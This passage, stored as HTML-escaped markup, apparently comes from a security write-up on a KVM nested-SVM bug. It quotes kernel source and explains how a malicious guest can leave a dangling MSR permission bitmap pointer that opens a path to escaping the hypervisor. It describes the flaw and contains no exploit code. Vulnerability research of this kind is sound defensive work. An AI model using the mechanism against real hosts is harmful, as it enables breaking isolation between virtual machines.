c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;ds &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;ds&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;gdtr &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;gdtr&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;idtr &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;idtr&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;efer &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;vcpu&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;arch&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;efer&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cr0 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;kvm_read_cr0&lt;/span&gt;&lt;span class="c1 c6"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3 c6"&gt;svm&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;vcpu&lt;/span&gt;&lt;span class="c1 c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cr4 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;vcpu&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;arch&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cr4&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;rflags &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;kvm_get_rflags&lt;/span&gt;&lt;span class="c1 c6"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3 c6"&gt;svm&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;vcpu&lt;/span&gt;&lt;span class="c1 c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;rip &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;kvm_rip_read&lt;/span&gt;&lt;span class="c1 c6"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3 c6"&gt;svm&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;vcpu&lt;/span&gt;&lt;span class="c1 c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;rsp &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;rsp&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;rax &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;rax&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0 c6"&gt;if&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;(&lt;/span&gt;&lt;span class="c3 c6"&gt;npt_enabled&lt;/span&gt;&lt;span class="c1 c6"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cr3 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cr3&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0 c6"&gt;else&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cr3 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;kvm_read_cr3&lt;/span&gt;&lt;span class="c1 c6"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3 c6"&gt;svm&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;vcpu&lt;/span&gt;&lt;span class="c1 c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2 c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; copy_vmcb_control_area&lt;/span&gt;&lt;span class="c1 c6"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3 c6"&gt;hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;control&lt;/span&gt;&lt;span class="c1 c6"&gt;,&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c6"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3 c6"&gt;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;control&lt;/span&gt;&lt;span class="c1 c6"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c11"&gt;&lt;span class="c1 c25"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;This becomes a security issue due to the way Model Specific Register (MSR) intercepts are handled for nested guests: &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;SVM uses a permission bitmap to control which MSRs can be accessed by a VM. The bitmap is a 8KB data structure with two bits per MSR, one of which controls read access and the other write access. A 1 bit in this position means the access is intercepted and triggers a vm exit, a 0 bit means the VM has direct access to the MSR. The HPA address of the bitmap is stored in the VMCB control area and for normal L1 KVM guests, the pages are allocated and pinned into memory as soon as a vCPU is created. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;For a nested guest, the MSR permission bitmap is stored in &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested.msrpm&lt;/span&gt;&lt;span&gt;&amp;nbsp;and its physical address is copied into the active VMCB (in &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;vmcb-&amp;gt;control.msrpm_base_pa&lt;/span&gt;&lt;span&gt;) while the nested guest is running. Using the described double invocation of &lt;/span&gt;&lt;span class="c15"&gt;nested_svm_vmrun&lt;/span&gt;&lt;span&gt;, a malicious guest can copy this value into the &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested.hsave&lt;/span&gt;&lt;span&gt;&amp;nbsp;VMCB when &lt;/span&gt;&lt;span class="c15"&gt;copy_vmcb_control_area&lt;/span&gt;&lt;span&gt;&amp;nbsp;is executed. This is interesting because the KVM&amp;rsquo;s hsave area normally only contains data from the L1 guest context so &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested.hsave.msrpm_base_pa&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;would normally point to the pinned vCPU-specific MSR bitmap pages. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;This edge case becomes exploitable thanks to a relatively recent change in KVM:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Since commit &amp;ldquo;&lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit?h=v5.11&amp;id=2fcf4876ada8a293d3b92a1033b8b990a7c613d3"&gt;2fcf4876: KVM: nSVM: implement on demand allocation of the nested state&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;&amp;rdquo; from last October, svm-&amp;gt;nested.msrpm is dynamically allocated and freed when a guest changes the SVME bit of the MSR_EFER register:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.efa5f977707b49310504dc9b5788dd5552d59d85"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm_set_efer&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_vcpu &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;u64 efer&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;to_svm&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u64 old_efer &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;arch&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;efer&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vcpu&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;arch&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;efer &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;efer&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;old_efer &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;EFER_SVME&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;efer &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;EFER_SVME&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(!(&lt;/span&gt;&lt;span class="c3"&gt;efer &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;EFER_SVME&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm_leave_nested&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm_set_gif&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;true&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c22"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Free the nested guest state, unless we are in SMM.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* In this case we will return to the nested guest&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* as soon as we leave SMM.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(!&lt;/span&gt;&lt;span class="c3"&gt;is_smm&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm_free_nested&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;For the &amp;ldquo;disable SVME&amp;rdquo; case, KVM will first call &lt;/span&gt;&lt;span class="c15"&gt;svm_leave_nested&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;to forcibly leave potential&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;nested guests and then free the &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested&lt;/span&gt;&lt;span&gt;&amp;nbsp;data structures (including the backing pages for the MSR permission bitmap) in &lt;/span&gt;&lt;span class="c15"&gt;svm_free_nested&lt;/span&gt;&lt;span&gt;. As &lt;/span&gt;&lt;span class="c15"&gt;svm_leave_nested&lt;/span&gt;&lt;span&gt;&amp;nbsp;believes that &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested.hsave&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;contains the saved context of the L1 guest, it simply copies its control area to the real VMCB:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0a10403251049de5c610583af2a5a4988152b9bf"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;void&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm_leave_nested&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;is_guest_mode&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;hsave &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;hsave&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span 